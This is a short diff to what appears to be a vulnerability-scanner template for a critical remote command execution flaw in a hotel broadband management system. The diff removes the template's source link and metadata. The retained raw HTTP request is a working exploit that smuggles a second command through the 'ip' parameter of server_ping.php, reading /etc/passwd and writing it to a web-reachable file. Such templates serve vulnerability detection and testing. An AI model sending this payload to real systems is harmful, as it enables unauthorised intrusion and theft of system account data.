@@ -3,12 +3,8 @@ info:
   name: 安美数字酒店宽带运营系统远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/auqy4zydirtsgo79'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: auqy4zydirtsgo79
-    fofa: 暂无
 http:
 - raw:
   - 'GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%3E../../password.txt&id=1 HTTP/1.1
